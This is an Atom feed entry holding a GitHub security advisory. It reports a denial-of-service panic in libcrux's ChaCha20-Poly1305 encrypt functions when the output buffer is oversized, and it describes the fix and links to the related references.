        <id>https://github.com/advisories/GHSA-hc3c-63hc-2r9f</id>
        <link href="https://github.com/advisories/GHSA-hc3c-63hc-2r9f"/>
        <updated>2026-05-19T16:18:36.000Z</updated>
        <content type="html"><![CDATA[<p>An application that passes in a ciphertext buffer of length greater
than <code>ptxt.len() + TAG_LEN</code> to <code>libcrux_chacha20poly1305::encrypt</code> or
<code>libcrux_chacha20poly1305::xchacha20_poly1305::encrypt</code> would
experience a panic.</p>
<h2 id="impact">Impact</h2>
<p>An application where the length of the ciphertext buffer is under
attacker control could be made to crash.</p>
<h2 id="mitigation">Mitigation</h2>
<p>The fix makes it so that <code>libcrux_chacha20poly1305::encrypt</code> and
<code>libcrux_chacha20poly1305::xchacha20_poly1305::encrypt</code> no longer
panic in this case, but instead write out the ciphertext and tag into
the first <code>ptxt.len() + TAG_LEN</code> bytes of the provided buffer.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cryspen/libcrux/pull/1386">https://github.com/cryspen/libcrux/pull/1386</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0124.html">https://rustsec.org/advisories/RUSTSEC-2026-0124.html</a></li>
<li><a href="https://github.com/advisories/GHSA-hc3c-63hc-2r9f">https://github.com/advisories/GHSA-hc3c-63hc-2r9f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hc3c-63hc-2r9f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-19T16:18:33.000Z</published>
    </entry>
</feed>